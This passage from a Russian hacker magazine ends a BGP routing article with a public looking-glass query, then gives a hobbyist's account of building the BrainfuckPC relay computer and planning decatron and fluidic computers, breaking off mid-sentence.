   Hurricane Electric поныне предос тавляет доступ к своему looking glass
еще и через telnet. Когда‐то это был стандартный способ, реализации вроде
Cisco IOS и Quagga или FRR предоставляют достаточно гибкое управление
правами  на  выполнение  команд,  чтобы  сделать  такую  конфигурацию
безопасной и разрешить только просмотр данных. Глянем, через кого трафик
из их сети пойдет в сеть Qrator (AS197068), за которой находится сайт
«Хакера». Отрезол вим xakep.ru (178.248.232.27) и выполним команду:


$ telnet route‐server.he.net
...
route‐server> show ip bgp 178.248.232.27 bestpath
BGP routing table entry for 178.248.232.0/23
Paths: (23 available, best #1, table Default‐IP‐Routing‐Table)
  Not advertised to any peer
    3491 197068 197068 197068
    216.218.252.151 from 216.218.252.151 (216.218.252.151)
      Origin IGP, metric 1, localpref 100, valid, internal, best
      Last update: Mon Sep 23 04:07:39 2019

Узнать, кому принадлежит номер автономной системы, можно через whois:
whois AS3491 скажет нам, что на момент написа ния статьи этот провайдер —
PCCW Global. Маршрутиза ция в интернете нередко меняется, так что не удив‐
ляйся, если повторишь и увидишь другой резуль тат.


ЗАКЛЮЧЕНИЕ
Управлять автономной системой бывает непросто, но если внимательно
читать документацию, это по силам каждому админу.
   Если ты не работаешь в компании со своей AS, но тебе хочется поэкспе‐
риментировать с маршру тизацией в похожих на реальные условиях, можно
присоединиться к DN42 — вир туальной сети, которая моделирует интернет
с BGP, DNS, whois и прочими атрибута ми.
GEEK


   ОПЕРАЦИЯ
 BRAINFUCKPC

           КАК Я ПОСТРОИЛ
САМЫЙ БЕЗУМНЫЙ РЕЛЕЙНЫЙ КОМПЬЮТЕР
 И НЕ СТАЛ НА ЭТОМ ОСТАНАВЛИВАТЬСЯ





Спаяв десять лет назад свою первую схему
на электромагнитных реле, спо собную сло‐
жить два чис ла, я подумал: вот было бы
здорово соз дать полноцен ный компьютер
на тысяче релюшек! Не знал я тогда, что         Artem Kashkanov                                                                                      Релейно‐декатронный
крепко подсяду на такое хобби и после воп‐            radiolok@yandex.ruманьяк
лощения затеянного замахнусь не только
на ламповую ЭВМ, но и на компьютер
на базе утерянной технологии создания
логических    элементов,    работа ющей
на струе воздуха.





          Релейный компьютер BrainfuckPC на фоне его автора

В 1974 году польский футуролог Ян Войцеховский выпустил свою культовую
книгу «Радиоэлектронные игрушки». В ней он описал возможности устройств
электронной техники тех лет, а также их предполагаемое использование
в каждой сфере нашей жизни в ближайшем будущем — электроника дома
и на работе, в спор те и школе, на нотных линейках и на четырех колесах;
игры, робототех ника и многое дру гое.





           Ян Вой цеховский. «Радиоэлектронные игрушки»

Один ее раздел — кибернетика — больше всего привлек мое внимание.
В нем было как описание воз можнос тей компьютеров будущего, так и схе ма
простой  модели  цифровой  вычислительной  машины  на  маленьких
телеграфных  реле. Эта микро‐ЭВМ по  сути  является прос тым ариф‐
метико‐логическим устройством и позволяет скла дывать и вычитать дво‐
ичные числа разрядностью до трех бит. В 2008 году я собрал эту недо‐ЭВМ
на советских электромагнитных реле РЭС22, рас ширив схему до четырех бит.
Она получила название «релейная цифровая вычис лительная машина №1»,
или сокращенно — РЦВМ‐1.





  Релейная циф ровая вычислительная машина №1. Реле, светоди оды
  и ворох проводов

В то же самое время в Нижего родском политехе на одной из лабораторных
работ по теоретическим основам электро техники мы изучали процесс заряда
и разряда конденсатора. В эксперименталь ной  установке конденсатор
попеременно подключался то к источнику питания, то к резис тору — соот‐
ветственно заряжаясь и раз ряжаясь с частотой 50 Гц. На осциллографе
рисовались   кривые   заряда‐разряда.  Переключением   конденсатора
туда‐сюда занималось малень кое герконовое реле РЭС55, и я удивился это‐
му факту: «обычные» реле, в которых при сутству ют якорь, контактные ламели
и прочие подвижные элементы, не способны переключаться быстрее,
чем 10–20 раз в секунду.





   Герконовые реле РЭС55, РЭС64 и РЭС43, исполь зованные в проекте

Я  задумал  соб рать  полноценную  электронно‐вычислительную  машину
на реле, способ ную самос тоятельно исполнять программы. Дальнейшие
эксперименты с герконовыми реле показа ли, что им по силам час тота перек‐
лючения в 1000–1200 Герц, то есть на два порядка быстрее, чем у обычных
реле. Именно этот факт привел меня к тому, что будущая машина должна
быть построена на гер коновых реле, чтобы иметь возможность стать самым
быстрым релейным компьютером в мире из существу ющих или сущес твовав‐
ших ранее.
   Нет, не единственным существу ющим в настоящий момент. В 2004 году
Гарри  Портер  показал  миру  свой  первый  современный  компьютер
на базе 415 электромагнитных реле. В четырех шка фах расположилась ЭВМ
с восьмиразрядной шиной данных, 16‐разрядной шиной адреса и прос тым
набором инструкций. Программы и данные хра нятся в микросхемах статичес‐
кой памяти на 32 Кбайта. Программы в него вводят с помощью панели прог‐
раммирования. Компьютер Портера способен работать на час тоте поряд‐
ка 5 Гц.





        Релейный компьютер Гарри Портера на фоне его автора

В 2005 году jbstanley повторил проект Портера. Его машина с названием «Ре‐
лейный компьютер №2» на базе 281 реле представляет собой упрощенную
архитектуру компьютера Гарри, но при этом имеет те же самые основные
характеристики – 16‐раз рядная шина адреса, восьмиразрядная шина данных
и ОЗУ на базе мик росхемы статичес кой памяти.





                  Релейный мини‐компьютер №2

С тех пор появились еще как минимум полтора десятка машин разных
самодельщиков, и как пра вило, они имеют схожие характеристики. Я тоже
времени не  терял. Собирал в огромных количес твах герконовые реле
РЭС55 и РЭС64 и проектировал свою будущую ЭВМ.


РЕЛЕЙНАЯ ЛОГИКА
Электромагнитное реле представляет собой электромагнит с блоком кон‐
тактов,  установ ленных  на  подвижном  якоре. При  подаче  напряжения
на  катушку  электромагнита  якорь  примаг ничивается   к  сердечнику
и переключает состояние контактов. Соеди няя контакты нескольких реле
в различных комбинациях, мы получим логичес кий элемент того или иного
типа.
 • Например,  соединив  нормально  разомкнутые  контакты  двух  реле
   последовательно, мы получим логичес кий элемент 2И. Сигнал на выходе
   будет тогда, когда напряжение будет подано на оба реле.
 • Соединив эти же самые контакты, но параллель но, получим 2ИЛИ — сиг‐
   нал на выходе будет, если хотя бы на одно реле подано напряжение.
 • Два последовательно соединенных нормально замкнутных контакта дадут
   логический элемент 2ИЛИ‐НЕ.
 • Они же, по параллельно соединенные — 2И‐НЕ.


             INFO

                    Более подробно про цифровую  логику  читай
                        в  статье   «Основы  цифровой  схемотехники.
                     Собираем сумматор».


Элементов 2И‐НЕ или 2ИЛИ‐НЕ дос таточно, чтобы соз дать любую логичес‐
кую схему. Каждый из них обра зует функци онально полный логический базис.
Говоря простым языком, они «Тьюринг‐полные» в понятиях булевой логики.
А если можно создать такой логический элемент, то и пол ноценная ЭВМ —
не проблема.





      Принципиальная схема базовых логических элементов на реле


РЦВМ-2 BUZZY
Изначально за основу этой машины я взял микроконтроллерную архитектуру
MSP430. Это пол ноцен ная 16‐разрядная архитектура с единым адресным
пространством для кода и данных. Здесь всего 27 инструкций, из них 11 —
математические операции АЛУ. 16 регистров общего назначения, орто‐
гональная система доступа к памяти — что может быть лучше?





         Принципиальная схема АЛУ про екта РЦВМ‐2 для 1 бита

На рисунке выше представлена принципиальная схема АЛУ будуще го компь‐
ютера для одного бита. Каждый пря моугольный блок — это простейший
логический эле мент на базе одно го или нес коль ких реле. С одной стороны,
выглядит несложно — много однотип ных элементов. С другой стороны,
на один бит требуется 36 реле — или 576 реле на 16‐раз рядное АЛУ. С уче‐
том 16 регистров по 16 бит каждый, кучи логики, защелок, декодера инструк‐
ций и т.д. общее количество реле, требуемое для осу ществления этой задум‐
ки, быстро перевалило за три тысячи. И тут на помощь пришел Brainfuck.


                                     Продолжение статьи →
GEEK                ← НАЧАЛО СТАТЬИ

         ОПЕРАЦИЯ
       BRAINFUCKPC
                                 КАК Я ПОСТРОИЛ
         САМЫЙ БЕЗУМНЫЙ РЕЛЕЙНЫЙ КОМПЬЮТЕР
            И НЕ СТАЛ НА ЭТОМ ОСТАНАВЛИВАТЬСЯ





ЯЗЫК ПРОГРАММИРОВАНИЯ BRAINFUCK
Brainfuck —  пожалуй,  самый  популярный  из  эзотерических  язы ков
программирования. А заодно самая нас тоящая Тьюринг‐полная тря сина.
Всего лишь восемь инс трукций, на которых можно писать все что угодно,
но очень долго. К примеру, на то, чтобы написать и отладить программу
деления двух целых чисел, которая печатает в терминал результат с шестью
знаками после запятой, у меня ушло три дня.





                    Инструкции языка Brainfuck

Весь синтаксис языка строится вокруг ОЗУ на 30 тысяч ячеек памяти с раз‐
рядностью 8 бит.
 • Двумя инструкциями + и  мы изменяем зна чение в текущей ячейке данных
   на единицу боль ше или меньше.
 • Двумя инструкциями < и > мы изменяем на единицу указатель на текущую
   ячейку данных, тем самым перемещаясь по памяти.
 • Еще две инструкции — [ и ] — позволя ют нам организовать циклы. Все,
   что внутри скобок, является телом цикла. Вложенные циклы допускаются.
   Логика инструкции проста — если значение текущей ячейки данных
   не равно нулю, мы выполним одну итерацию цикла, если равно, то
   выходим из него.
 • Последние две инструкции — . и , . Они позволяют вывести значение
   текущей ячейки в терминал или ввес ти его с устройства ввода в ОЗУ.
   Это позволяет писать интерактивные программы.

Да, этого более чем дос таточно для написания любой программы. Существо‐
вание компиляторов из языка C в Brainfuck подтверждает это. Но плотность
кода — никакущая. Для выполнения простейших операций, например сло‐
жения двух переменных, требуется исполнить сотни инструкций Brainfuck.
В этом и заключается вся ака демичес кая прелесть языка, и в результате мно‐
гие программисты практикуются в соз дании программ на нем. Они уже
написали тысячи приложений, и, если мы сможем исполнять их на релейном
компьютере, это будет хорошо.


BRAINFUCK++
Есть  небольшой  вариант  оптимизации  плотности  кода  на  Brainfuck.
Программы в большинс тве своем сос тоят из последовательностей инс трук‐
ций + — < >. Например, десять операций инкремента мы можем заменить
на равноценную операцию +10. Двадцать операций сдви га указателя впра‐
во — на операцию > 20 и так далее. В итоге некоторые программы потребу‐
ют на 20–30% меньше тактов, а какие‐то будут уско рены в нес колько раз.





                   Инструкции языка Brainfuck++

Таким образом, в 2016 году мое техничес кое задание на раз работку релей‐
ного компьютера приняло окончательный вид. Я решил соз дать полноценный
компьютер на базе герконовых реле со следующими характеристиками.
 • Набор инструкций Brainfuck++.
 • Полноценная 16‐разрядная архитектура фон Неймана — и шина адреса,
   и шина данных шириной 16 бит. Программы на Brainfuck, как правило,
   восьмиразрядные, так что требуется обеспечить обратную совмести‐
   мость.
 • Декодирование инструкций и все вычисления реализованы на релей ной
   логике.
 • Рабочая частота — многократно превышающая существующие решения
   на реле (то есть существенно выше пяти инструкций в секунду).
 • ОЗУ на базе микросхем SRAM (как и у других самодельщиков).


BRAINFUCKPC
Центральным элементом релейного процессора в этом компьютере стал 16‐
разрядный полный сумматор с параллельным переносом. К нему на вход под‐
клю чены два регистра. TMP — временный регистр, в который помещается
старое значение, и CMD — командный регистр, где хранится инструкция
и константа, на которую будет изменяться старое зна чение.
  Поэтому я могу исполнять операции опти мизи рованного Brainfuck++,
а заодно получить пол ноценные условные переходы — Jump  If Zero и Jump
If Not Zero — в любую сторону программы. Если значение текущей ячейки
ноль (или не ноль) — прыгаем по коду вперед или назад на расстояние N.
  Результат опе рации суммирования может быть выгружен в один из кон‐
текстных регистров — AP — с номером текущей ячейки данных, или IP —
с номером текущей инс трукции. Либо результат может быть выгружен
в текущую ячейку ОЗУ, если речь идет об инс трукциях + и ‐.





  Архитектура релейного компьютера. Стадия загрузки новой инструкции
  сменяется стадией ее исполнения

Инструкция исполняется за один такт. По нарастающему фронту производит‐
ся считывание оче редной инс трукции из памяти. Для этого старое значение
регистра IP загружается во временный регистр, с помощью сумматора при‐
бавляем к нему единичку и перезаписываем регистр IP новым значением.
Строб по памяти — и в командном регистре лежит очередная инструкция.
  По спадающему фрон ту сигнала тактирования начинается исполнение
этой инструкции. Если она работает с сумматором, то этот процесс выглядит
примерно так же, как и процесс загрузки новой инструкции — помещаем ста‐
рое значение во временный регистр, прибавляем лежащую в младших битах
регистра CMD  константу,  результат  записы ваем  обратно  в  регистр
или текущую ячейку данных.


Модуль
В основе конструкции — небольшой модуль на печатной плате, который
реализует простую логическую операцию.





               Различные модули релейного компьютера

 • Модуль 2AND/2XOR — две независимые друг от дру га логичес кие опе‐
   рации — 2AND и 2XOR. 32 шту ки используются в блоке сумматора, по два
   модуля на бит.
 • Модуль D‐триггера — 64 штуки ухо дят на два регистровых блока.
 • Модуль диодный — прос то восемь диодов на плате для реализации мно‐
   говходового  диодного OR  либо  однонаправленной  линии  данных.
   Это грязный хак, но он поз воляет экономить как на реле, так и на времени.
  В отличие от реле, сиг нал переда ется на выход такого логического эле‐
  мента мгновенно. С другой сто роны, в релейном калькуляторе «Вильнюс»
   вовсю использовались диоды, так что наличие диодов в связ ке с реле —
   вполне допустимый шаг.
 • Модуль 2& — это базовый кирпичик. По сути — четыре независимых друг
   от друга реле с контактом на переключение для реализации абсолютно
  любой логической схемы.
 • Универсальный модуль 2AND/2OR, который также позволяет реализовать
   практически какую угодно логическую функцию — 4AND, 4OR, 4AND‐NOT,
  4OR‐NOT и так далее.

Все модули имеют одинаковые раз меры 60 × 44 мм, 16‐контактный разъ ем
с одной стороны и светодиоды с дру гой стороны. Диоды показывают, какое
реле включено, что очень помогает при пошаго вой отладке машины. Ну и как
минимум это красиво.


Блок
32 модуля по восемь модулей в четыре ряда объеди няются в функциональ‐
ный блок. Всего блоков пять.





  Три основных блока релейного компьюте ра. На переднем плане — инди‐
  каторный модуль и модули защелок (переключатель с 16 замыкающими
  контактами)

 • Блок сумматора (на фото в центре) — 16‐раз рядный полный сумматор.
  Два 16‐разрядных вхо да для чисел, одна линия переноса нулевого раз‐
   ряда, два выхода. На одном — результат операции суммирования, на дру‐
   гом — результат XOR между вхо дами. Может использоваться как самос‐
   тоятельная операция (но не использует ся). Это побочная воз можность,
   которая возникла в результате особен ностей схемы суммирования. Опе‐
   рация вычитания производится в допол нительном коде. А точнее — при‐
   бавлением  к  старому зна чению большого числа, которое вызывает
   переполнение сумматора. Сигнал переполнения не используется, а оста‐
   ток на выходе как раз соответству ет необ ходимому результату.
 • Блок контекстных регистров IP/AP (пра вый блок) — два независимых 16‐
   разрядных регистра. Прямые выходы регистра Q через защел ки под клю‐
   чаются к тем или иным шинам процессора.
 • Блок регистров TMP/CMD (левый блок) — тоже содержит два регистра:
   временный регистр и командный регистр. У последнего младшие 12 раз‐
   рядов расширяются до 16 (копиро вани ем 12‐го бита) и подключаются
   ко входу сумматора. Стар шие четыре раз ряда хранят тип инс трукции.
 • Два блока логики. Один блок используется для декодирования инструк‐
   ций, второй — работает секвенсором импульсов и непосредственно
   исполняет команду, подавая сигналы управления на остальные блоки.

Все блоки имеют одинако вые раз меры 200 × 150 мм и представляют собой
напечатанные из пластика корзинки с «ушами» для крепления на раме.
Модули втыкаются в плату с разъемами, на которой прошивается схе ма
с помощью монтажа накруткой.





              Назначение бло ков релей ного компь ютера

Собрав все блоки воедино парой десятков мет ров шлейфов, мы получаем
BrainfuckPC — 16‐разрядный компьютер с процес сором на базе герконовых
реле, архитектурой фон Неймана и набором инс трукций Brainfuck++.
 • Общее число реле: 578 штук
 • Общее число логических элементов: 157 штук
 • Разрядность шины адреса: 16 бит
 • Адресация: пословная
 • ОЗУ: 128 Кбайт (64 тысячи слов)
 • Разрядность шины данных: 16‐бит/8‐бит
 • Тактовая частота (текущая/максимальная): 25 Гц/40 Гц
 • Потребляемая мощ ность: 70 Вт
 • Габаритные размеры: 1100 × 650 × 140 мм
 • Масса: 25 кг





TO BE CONTINUED
Хотя компьютер уже и спо собен самостоятель но исполнять некоторые
программы, проект по его сборке еще не завершен. Однако после двух лет
непрерывной работы над этим проектом у меня накопилась куча других
задумок, которые ждут своего часа. Точных сроков завершения проекта я
себе не назначал, а вот над списком того, что еще требуется сде лать,
подумал.
 • Необходимо заменить плату памяти на новую, на которой установлены
   только микросхемы ОЗУ и цепи согласова ния с релейными уровнями.
   Печатная плата уже разведена и изготовлена, все комплектующие име‐
   ются — осталось только сесть и спа ять. Правда, чтобы заменить текущую
   плату памяти на новую, надо будет дополнитель но доделать программа‐
   тор — ведь встроенный заг рузчик на новой плате памяти отсутс твует.
 • Вместе с новой платой памяти будут уста новлены стрелочные индикаторы,
   нормальный крепеж терминального дисплея и самос тоятельная логика
   обновления светодиодной панели (которая, к слову, отображает некото‐
  рую область памяти данных — что тоже сделано для нагляднос ти работы
   компьютера).
 • Программатор,  вернее,  разработ ка  прошивки  для  него.  Вообще,
   на компьютере имеется специальный разъем для программирования —
   и через него можно загружать программу в компьютер как с перфоленты,
   так и с панели тумблеров. Но так как программу необходимо грузить в ОЗУ
   каждый раз после включения ЭВМ, использовать полноценный прог‐
  рамматор несколько проще.
 • Логика самотак тирования. В настоящий момент с микросхемы генери‐
   руется сигнал частотой 12–25 Гц и подается на вход сис темы тактирова‐
   ния. Однако можно сделать  так, чтобы по завершении исполне ния
   текущей инструкции компьютер сам выдавал сигнал для старта сле‐
   дующей, без исполь зования внешнего сигнала тактирования. Тут надо
   докрутить буквально два‐три модуля, и компьютер в этом режиме сможет
   исполнять инструкции на максимально воз можной час тоте. Но внешнее
   тактирование все равно пригодит ся, например если мы захотим так‐
   тировать ЭВМ от MIDI‐кла виатуры.
 • Инструкция чтения из консоли. Она завязана на логику тактирования (в
   синхронном режиме работы компь ютер дол жен останавливать работу
   и ждать поступления данных).
 • Отправить заявку в книгу рекордов Гин несса… Как на самый быстрый
   релейный процессор и при этом одновременно самый медленно счи‐
   тающий. 16 миллифлопс — «это вам не шубу в тру сы заправлять» (цитирую
   комментарий на YouTube).


DEKATRONPC
Релейный компьютер — серьезная веха в самодельном компьютерос тро‐
ении, но надо двигать ся дальше и обуздывать ламповую логику. Все же
релейные ЭВМ — это машины даже не первого поколе ния. Согласно
общепринятой классифика ции, ЭВМ первого поколения — это ламповые
машины, история которых началась в 1948 году с Манчестерской малой
экспериментальной машины. При этом годом ранее уже был изобретен тран‐
зистор, и с 1950‐х годов начали появлять ся ЭВМ вто рого поколения. Но это
не помешало разрабатывать все новые и новые ламповые компьютеры
вплоть до 1960‐х годов.
  Сейчас самая старая из работающих ламповых ЭВМ — это Harwell com‐
puter постройки 1951 года. Небольшой вычислительный комплекс на сотнях
ламп и декатронов работал на малых скорос тях — человек с листком спо‐
собен  вычислять  с  аналогичной  ско ростью, однако не может  делать
это десятки часов подряд. Harwell computer оказал ся довольно надежной
машиной, возможно ввиду своей нетороп ливос ти. В 2012 году он был восста‐
новлен и в настоящее время выставляется в Национальном музее вычис‐
лительной техники в Блетчли‐парк в Англии.
  Одной из наиболее извес тных отечественных ламповых серийных ЭВМ
была малая машина «Урал‐1».





                Урал‐1 в Политехническом музее, Москва

Как и Harwell, это неторопливая (100 инструкций в секунду) и надежная
машина. Один из ее экземпляров занимался расчетами траекторий ракет
на космодроме Байконур. Судя по некоторым фотографиям, на Байконуре
как минимум сохранились пара шкафов от «Урала‐1». Пол ностью укомплек‐
тованная ЭВМ, судя по всему, оста лась толь ко в Политехническом музее
в Мос кве. К сожале нию, время ее не пощадило и восстановить машину
в исходном состоянии ока залось невоз можно — под панелью оператора
теперь скры то несколь ко печатных плат с ПЛИС, внут ри которых реализован
эмулятор машины. Ну а лампочки на шкафах теперь моргают исключительно
для красоты.
  В  выборе  архитектуры  моего  компь юте ра  сыграли  одновре менно
несколько факторов. Во‐первых, уже опробованная архитектура на основе
Brainfuck, которая привносит в проект как долю безумия, так и прос тоту
машины, банально за счет меньшего числа элементов, необходимых для ее
постройки. Шесть из восьми инструкций Brainfuck представляют собой опе‐
рацию инкремента и декремента. При этом сущес твует спе циальная лампа,
которая как раз предназна чена для того, чтобы денно и нощно инкремен‐
тировать и декрементировать. Это декатрон.


ДЕКАТРОНЫ





   Перемещение тле ющего разряда в декатроне в замедленной съемке

Декатрон — это многоэлектродная газоразрядная лампа, предназначенная
для реверсивного счета импульсов. В центре находится диск анода, а вокруг
него расположе ны тридцать электродов. Десяток катодов и две группы под‐
катодов — по два подкатода между каждым  катодом. Пос ле подачи
напряжения на декатрон между анодом и одним из катодов загорается тле‐
ющий разряд. Подавая импульсы определен ной пос ледовательности на под‐
катоды и соседний катод, мы можем перемещать разряд между катодами,
обеспечивая операцию инкремента или декремента. Да эта лампа просто
создана для языка Brainfuck!





           Механизм перемещения разряда в декатроне

На базе декатрона мы можем соз дать прос той реверсивный десятичный
счетчик. Соединим нужное число таких счетчиков последовательно и получим
многоразрядный счетчик, который, например, на базе трех декатронов смо‐
жет считать от 0 до 999.





              Архитектура ядра лампового компь ютера

Один такой счетчик на базе шес ти декатронов будет определять номер
текущей исполняемой инструкции. В допол нение к нему нам нужен счетчик
глубины вложенности циклов — сумматора в будущем компьютере нет, а зна‐
чит, начало текущего цикла придется искать вручную, банально перематывая
счетчик инструкции назад до тех пор, пока начало нашего цикла не будет най‐
дено. Счетчик вло женных циклов поможет корректно искать нужное начало,
даже  если  внутри  нашего  цикла  мно жес тво  вложенных.  Счетчика
от 0 до 999 будет более чем дос таточно: в программах на Brainfuck, написан‐
ных людьми, даже больше 20–30 уровней вложенности циклов — редкость.
   Третий счетчик от 0 до 29 999 будет определять номер текущей ячейки
данных. Так как у нас чис тый Brainfuck, то и число ячеек в точности соответс‐
твует  исходной  спецификации.  Декатронный  счетчик можно  сбросить
при любых значениях.
  По адресу этого счет чика происходит выборка данных из ОЗУ. Данные
помещаются в четвертый счет чик, который умеет считать от 0 до 255. То есть
мы загружаем в декатрон наше старое значение, делаем инкремент или
декремент и выгружаем данные обратно в память.





                Структурная схема лампового компьютера



                                     Продолжение статьи →
GEEK                ← НАЧАЛО СТАТЬИ

         ОПЕРАЦИЯ
       BRAINFUCKPC
                                 КАК Я ПОСТРОИЛ
         САМЫЙ БЕЗУМНЫЙ РЕЛЕЙНЫЙ КОМПЬЮТЕР
            И НЕ СТАЛ НА ЭТОМ ОСТАНАВЛИВАТЬСЯ





СИСТЕМА КОМАНД
Одно из тре бований к ламповому компьютеру — чтобы инс трукции в нем
в точности соответствовали языку Brainfuck. Второе тре бование — 99%
существующих восьмибитных программ на Brainfuck дол жны исполняться
исключительно на ламповой логике. Оставшийся 1% банально может не уме‐
щаться в ОЗУ. Максимум того, что допускается использовать в аутентичной
части машины, — это гер маниевые диоды, да и то лишь в схемах обвязки
кубов памяти.





В итоге мы име ем:
 • NOP — пустая инструкция, необ ходимая для выравнивания циклов внутри
   кеш‐линеек;
 • + и  — инкре мент и декремент текущей ячейки данных;
 • < и > — изме нение номера текущей ячейки;
 • [ и ] — начало и конец цикла;
 • . и , — печать текущего символа в консоль и ввод из консоли.

Инструкция кодируется четырехбитным значени ем, а это значит, что остается
еще семь свободных инс трукций, которые можно использовать для управле‐
ния машиной.
  Например, инструкция HALT остановит машину при завершении работы
программы. Еще две инструкции — LOAD и STORE — оптимизируют работу
с памятью.
  Допустим, у нас есть десять инс трукций +, иду щих подряд. Нам придется
десять раз повторить следующий набор действий:
 • прочитать значение текущей ячейки и записать его в декатронный счетчик;
 • выполнить операцию инкремента;
 • записать новое значение текущей ячейки из счетчика в ОЗУ.

По факту мы девять раз прос то так будем делать загрузку‐выгрузку. Проще
явно сказать, что нужно сделать LOAD из памяти в счетчик и STORE обратно
из счетчика в ОЗУ. Либо ламповая логика должна понимать, какая инструкция
будет идти следом за текущей и выполнять LOAD и STORE неявно, не тратя
в дальнейшем время на холос тые загрузки‐выгрузки.
  С одной стороны, неявный LOAD/STORE позволит грузить в компьютер
программы, написанные на Brainfuck вообще без модификаций. С другой
стороны, усложняется логика выборки инструкции, так как необходимо читать
на одну инструкцию вперед.


Де катроны
На картинке ниже — самые быстрые коммутаторные декатроны А103 окталь‐
ного типа со скоростью счета до 50 тысяч импульсов в секунду. У них есть
и более быстрые младшие братья — А107 и А110, которые способны считать
на скоростях до 1 МГц, но найти их мне пока что не удалось.





Эти декатроны и будут центральным элементом машины. В отличие от декат‐
ронов  счетного  типа,  у коммутаторных  все  десять  катодов выведены
на цоколь. Это позволяет считывать текущее зна чение из декатрона либо заг‐
рузить в него необходимое число. Декат ронов А103 нужно всего ничего —
17 штук.
  Однако для создания реверсивных многораз рядных счетчиков каждому
декатрону в обвязку потребуется штук 25 ламп — диодов, триодов, пентодов.
Благо ламп у меня вполне дос таточно для начала работ — более 500 штук.
Хотя панелек для них, в частнос ти девятиштырь ковых под 6Н3П, почти нет.


Хранение программ
Программы предполагается хра нить на перфоленте. Тем более что у меня
имеется как перфоратор ПЛ‐20/2 для пробивания программ на ленте, так
и считыватели перфоленты — фотоэлектричес кий FS1501 и электромеха‐
нический Soemtron 472/3.





  Слева направо. Считыва тель перфолент Soemtron 472/3 и ленточный
  перфоратор ПЛ‐20/2

В последнем совсем нет электроники, а значит, он идеально подходит
для этого проекта и не принесет в него элементов другой эпохи. Питаются
такие аппараты бумажной лентой шириной 25 мм. На ленте пробивается
девять дорожек — восемь для данных и одна синхродорожка. Плотность
записи — 2,5 мм на байт или 400 байт на метр. В среднем одна программа
будет занимать пару‐тройку метров перфолен ты.


Терминалы
Разумеется, такому компьютеру для интерактивных программ требуется
аутентичный терминал — как для ввода символов, так и для их вывода. Иде‐
ально подойдет, например, электромеханическая печатная машинка Consul
260 классического рычажного типа, в моем слу чае — с латинскими и кирил‐
лическими литерами.





           Электромеханичес кая печатная машин ка Consul 260

Раскладка JCUKEN, когда привык к QWERTY — это ужасное зло. Но, в отличие
от другой име ющейся  у меня печатной машинки Robotron S6130, эта
в рабочем состоянии, нуж но только еще раз осмотреть и почис тить от пыли
после долгого хранения. Внутри у нее матрица кнопок да электродвигатель
с электромагнитами. Никакой электроники.


Ну и куда же без ферритовой памяти!
Еще одно сокровище, которое я припас для этого проекта, — миниатюрные
кубы ферритовой памяти. Они залиты компаундом микросборки, а внутри
у них стопка мно гоот верс тных фер ритовых плас тин — младший брат памяти
на ферритовых коль цах.





                      Ку бы памяти типа КП128/17

Каждый такой кубик может хранить целых 256 байт данных. Предполагается,
что на память программ уйдет шесть модулей — в виде трех кеш‐линеек
по два куба, 1024 инструкции в каждой кеш‐линейке; а на память данных —
девять модулей по три куба в трех линейках и 768 ячеек данных в каждой
кеш‐линейке.
   Итого 3 килобайта памяти прог рамм и 2,25 Кб памяти данных. С одной
стороны, это не исходные 30 Кбайт, как в Brainfuck, с другой — этого более
чем достаточно для 99% программ. Так уж вышло, что ферритовая память
большого объема — редкость. Но если мне удас тся найти куб на 30 Кбайт
для памяти данных, я вос пользуюсь этой возможностью.
  Другой вариант: вспомнить задумку с тремя кеш‐линейками. Когда
в одной кеш‐линейке хра нится текущая тысяча инс трукций, в другой — пре‐
дыдущая, еще в одной — следующая. И когда мы переходим из одной линей‐
ки в другую, мы быстро подгружаем очередную порцию данных в линейку
с очень старым диапазоном, нивелируя возможные задержки дос тупа к внеш‐
нему ленточному накопителю.
  Накопителей, кстати, у меня два — девяти дорожечные, на магнитных лен‐
тах (и куча лент к ним). Это СМ5300.01, которые использовались в ЭВМ
СМ1420 и похожих моделях.





            Накопитель на магнитной лен те СМ53000.01


DEKATRONPC CHALLENGE
Сейчас у меня соб рано все железо, нужное для начала экспериментов. Впе‐
реди — долгий и интерес ный про цесс проектирования и сборки будущей
машины. В отличие от релейного компь ютера с его монолитной конструк‐
цией, здесь будет блочная. Тот или иной блок можно будет собрать за пару
месяцев и продол жать спокойно заниматься дру гими делами.
  Однако не стоит забывать о нормальном моделировании схемотехники
будущей ЭВМ. Для начала в планах написать программный эмулятор,
в котором виртуально реализована предполагаемая архитектура.
  На втором этапе эту же самую архи тек туру необходимо реализовать
на языке VHDL или Verilog и запус кать как в эмуляторе, так и на живой ПЛИС.
   Третьим этапом будет воссозда ние блоков в железе и их под ключение
к ПЛИС. Получается, что бло ки можно будет использовать для реальных
вычислений по ходу строительства компьюте ра. Потом, замещая один за дру‐
гим эмулируемые блоки реальным железом, мы пол ностью избавимся
от ПЛИС, и ламповый компьютер станет полностью самостоятельным. Проект
будет считаться завершенным, когда от ПЛИС в системе не останется и сле‐
да.
  Впереди много разноплановой работы: эксперименты с ламповой логикой
и ферритовой памятью, создание реверсивных декатронных счетчиков...
В общем, будет весело.


FLUIDICPC
А чтобы было еще веселее, я придумал другой проект компьютера, на еще
более экзотической элементарной базе.
  Два описанных выше проекта можно описать так: «Реле → Релейная
логика → релейный компьютер BrainfuckPC», «Лампы → Ламповая логика →
ламповый компьютер DekatronPC».
  В общем, если на чем‐то мож но соз дать логический элемент, на этом
можно построить и полноценное электронно‐вычислительное устройство.
И одно из самых безумных физических явлений, которое только можно обуз‐
дать для этих целей, — это эффект прилипания струи, или эффект Коанда.





          Создание зоны раз ряжения между струей и стенкой

Суть эффекта заключается в том, что ламинарная струя жидкости или газа,
выходящая из сопла, стремится откло ниться в сторону стенки и при опре‐
деленных условиях прилипает к ней за счет создаваемой между стенкой
и струей зоны понижен ного давления.
  Попробуй взять обычную столовую лож ку и нап равить на нее спокойный
поток воды из‐под крана — струя воды прилип нет к ложке и отклонится в сто‐
рону.
   Теперь все, что нам нужно для логического элемента, это ламинарная
струя воздуха, две стенки и возможность переки дывать поток воздуха между
ними с помощью каналов управления. На рисунке хорошо видно, как после
подачи давления на левый канал управления струя воздуха, выходящая
из канала питания, перекидывается к противоположной стенке. Это и есть
простейший базовый логический элемент.





              Переключение бистабильного элемента

Отечественной промышленностью были раз работа ны альбомы пневмоничес‐
ких элементов. Я и мой товарищ Антон взяли за осно ву элементы серии «Вол‐
га», разработанные во ВНИИМАШ, и начали их оцифровывать. Элементы
этой серии представляют собой небольшие пластиковые модули из двух час‐
тей размерами 50 × 40 мм. У них, как правило, имеется канал питания, два
выходных канала, каналы сброса избыточного давления и несколько каналов
управления.





                 3D‐модели элементов серии ВОЛГА

В самом начале экспериментов стоит задача воспроизвести в материале
элементы 2ИЛИ‐НЕ и RS‐триггера. В прин ципе, этого уже будет достаточно
для создания простейшего компьютера — оста нет ся только сделать мас‐
